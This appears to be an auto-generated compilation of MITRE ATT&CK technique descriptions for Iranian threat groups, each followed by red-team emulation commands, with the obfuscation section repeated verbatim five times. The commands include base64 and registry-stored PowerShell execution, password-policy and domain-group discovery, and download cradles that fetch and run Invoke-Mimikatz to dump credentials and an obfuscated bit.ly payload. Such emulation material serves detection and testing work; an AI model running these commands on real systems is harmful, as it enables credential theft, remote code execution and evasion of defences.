Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)
```

## Technique Commands

```
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

powershell.exe -EncodedCommand $EncodedCommand
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))"
[a-z0-9]{1}.exe
*.exe \*.exe\:Zone.Identifier:$DATA"
```



# Actor: Magic Hound

## Actor Description

```
[Magic Hound](https://attack.mitre.org/groups/G0059) is an Iranian-sponsored threat group operating primarily in the Middle East that dates back as early as 2014. The group behind the campaign has primarily targeted organizations in the energy, government, and technology sectors that are either based or have business interests in Saudi Arabia.(Citation: Unit 42 Magic Hound Feb 2017)(Citation: FireEye APT35 2018)
```

## Actor Aliases

```
Magic Hound
Rocket Kitten
Operation Saffron Rose
Ajax Security Team
Operation Woolen-Goldfish
Newscaster
Cobalt Gypsy
APT35
```

## Technique Name: Obfuscated Files or Information

## Technique Description

```
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)
```

## Technique Commands

```
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

powershell.exe -EncodedCommand $EncodedCommand
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))"
[a-z0-9]{1}.exe
*.exe \*.exe\:Zone.Identifier:$DATA"
```



# Actor: MuddyWater

## Actor Description

```
[MuddyWater](https://attack.mitre.org/groups/G0069) is an Iranian threat group that has primarily targeted Middle Eastern nations, and has also targeted European and North American nations. The group's victims are mainly in the telecommunications, government (IT services), and oil sectors. Activity from this group was previously linked to [FIN7](https://attack.mitre.org/groups/G0046), but the group is believed to be a distinct group possibly motivated by espionage.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: Symantec MuddyWater Dec 2018)(Citation: ClearSky MuddyWater Nov 2018)
```

## Actor Aliases

```
MuddyWater
Seedworm
TEMP.Zagros
```

## Technique Name: Obfuscated Files or Information

## Technique Description

```
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)
```

## Technique Commands

```
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

powershell.exe -EncodedCommand $EncodedCommand
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))"
[a-z0-9]{1}.exe
*.exe \*.exe\:Zone.Identifier:$DATA"
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Obfuscated Files or Information

## Technique Description

```
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)
```

## Technique Commands

```
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

powershell.exe -EncodedCommand $EncodedCommand
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))"
[a-z0-9]{1}.exe
*.exe \*.exe\:Zone.Identifier:$DATA"
```



# Actor: APT33

## Actor Description

```
[APT33](https://attack.mitre.org/groups/G0064) is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)
```

## Actor Aliases

```
APT33
Elfin
```

## Technique Name: Obfuscated Files or Information

## Technique Description

```
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also used compressed or archived scripts, such as Javascript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also obfuscate commands executed from payloads or directly via a [Command-Line Interface](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and whitelisting mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017) (Citation: PaloAlto EncodedCommand March 2017)

Another example of obfuscation is through the use of steganography, a technique of hiding messages or code in images, audio tracks, video clips, or text files. One of the first known and reported adversaries that used steganography activity surrounding [Invoke-PSImage](https://attack.mitre.org/software/S0231). The Duqu malware encrypted the gathered information from a victim's system and hid it into an image followed by exfiltrating the image to a C2 server. (Citation: Wikipedia Duqu) By the end of 2017, an adversary group used [Invoke-PSImage](https://attack.mitre.org/software/S0231) to hide PowerShell commands in an image file (png) and execute the code on a victim's system. In this particular case the PowerShell code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary. (Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)
```

## Technique Commands

```
sh -c "echo ZWNobyBIZWxsbyBmcm9tIHRoZSBBdG9taWMgUmVkIFRlYW0= > /tmp/encoded.dat"
cat /tmp/encoded.dat | base64 -d > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

powershell.exe -EncodedCommand $EncodedCommand
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = 'Write-Host "Hey, Atomic!"'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name Debug -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} Debug).Debug)))"
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion #{registry_entry_storage}).#{registry_entry_storage})))"
[a-z0-9]{1}.exe
*.exe \*.exe\:Zone.Identifier:$DATA"
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Password Policy Discovery

## Technique Description

```
Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).

Password policies can be set and discovered on Windows, Linux, and macOS systems. (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)

### Windows
* <code>net accounts</code>
* <code>net accounts /domain</code>

### Linux
* <code>chage -l <username></code>
* <code>cat /etc/pam.d/common-password</code>

### macOS
* <code>pwpolicy getaccountpolicies</code>
```

## Technique Commands

```
cat /etc/pam.d/common-password
cat /etc/security/pwquality.conf
cat /etc/pam.d/system-auth

cat /etc/security/pwquality.conf
cat /etc/login.defs
net accounts
net accounts /domain
pwpolicy getaccountpolicies
powershell/situational_awareness/network/powerview/get_gpo
powershell/situational_awareness/network/powerview/get_gpo
Dos
Microsoft Windows [Version 10.0.14393]
(C) 2016 Microsoft Corporation. all rights reserved.

C: \ Users \ administrator.0DAY> net accounts
How long must force users to log off after time expires:? Never
Minimum password age (days): 1
Maximum password age (days): 42
Minimum password length: 7
Keep the length of the password history: 24
Lockout threshold: Never
Lockout duration (minutes): 30
Lock observation window (minutes): 30
Computer role: SERVER
The command completed successfully.
```



# Actor: OilRig

## Actor Description

```
[OilRig](https://attack.mitre.org/groups/G0049) is a suspected Iranian threat group that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. (Citation: Palo Alto OilRig April 2017) (Citation: ClearSky OilRig Jan 2017) (Citation: Palo Alto OilRig May 2016) (Citation: Palo Alto OilRig Oct 2016) (Citation: Unit 42 Playbook Dec 2017) (Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 QUADAGENT July 2018) This group was previously tracked under two distinct groups, APT34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity.
```

## Actor Aliases

```
OilRig
IRN2
HELIX KITTEN
APT34
```

## Technique Name: Permission Groups Discovery

## Technique Description

```
Adversaries may attempt to find local system or domain-level groups and permissions settings. 

### Windows

Examples of commands that can list groups are <code>net group /domain</code> and <code>net localgroup</code> using the [Net](https://attack.mitre.org/software/S0039) utility.

### Mac

On Mac, this same thing can be accomplished with the <code>dscacheutil -q group</code> for the domain, or <code>dscl . -list /Groups</code> for local groups.

### Linux

On Linux, local groups can be enumerated with the <code>groups</code> command and domain groups via the <code>ldapsearch</code> command.

### Office 365 and Azure AD

With authenticated access there are several tools that can be used to find permissions groups. The <code>Get-MsolRole</code> PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts.(Citation: Microsoft msrole)(Citation: GitHub Raindance)

Azure CLI (AZ CLI) also provides an interface to obtain permissions groups with authenticated access to a domain. The command <code>az ad user get-member-groups</code> will list groups associated to a user account.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)
```

## Technique Commands

```
net localgroup "Administrators"
shell net localgroup "Administrators"
post/windows/gather/local_admin_search_enum
net group ["Domain Admins"] /domain[:DOMAIN]
net group ["Domain Admins"] /domain
domain_list_gen.rb
post/windows/gather/enum_domain_group_users
dscacheutil -q group
dscl . -list /Groups
groups
net localgroup
net group /domain
get-localgroup
get-ADPrincipalGroupMembership administrator | select name
net group /domai 'Domain Admins'
net groups 'Account Operators' /doma
net groups 'Exchange Organization Management' /doma
net group 'BUILTIN\Backup Operators' /doma
powershell/situational_awareness/host/get_pathacl
powershell/situational_awareness/host/get_pathacl
powershell/situational_awareness/network/powerview/get_object_acl
powershell/situational_awareness/network/powerview/get_object_acl
powershell/situational_awareness/network/powerview/map_domain_trust
powershell/situational_awareness/network/powerview/map_domain_trust
powershell/situational_awareness/host/get_uaclevel
powershell/situational_awareness/host/get_uaclevel
```



# Actor: CopyKittens

## Actor Description

```
[CopyKittens](https://attack.mitre.org/groups/G0052) is an Iranian cyber espionage group that has been operating since at least 2013. It has targeted countries including Israel, Saudi Arabia, Turkey, the U.S., Jordan, and Germany. The group is responsible for the campaign known as Operation Wilted Tulip. (Citation: ClearSky CopyKittens March 2017) (Citation: ClearSky Wilted Tulip July 2017) (Citation: CopyKittens Nov 2015)
```

## Actor Aliases

```
CopyKittens
```

## Technique Name: PowerShell

## Technique Description

```
PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 

PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.

Administrator permissions are required to use PowerShell to connect to remote systems.

A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  PowerSploit, (Citation: Powersploit) and PSAttack. (Citation: Github PSAttack)

PowerShell commands/scripts can also be executed without directly invoking the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly exposed through the .NET framework and Windows Common Language Interface (CLI). (Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015) (Citation: Microsoft PSfromCsharp APR 2014)
```

## Technique Commands

```
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
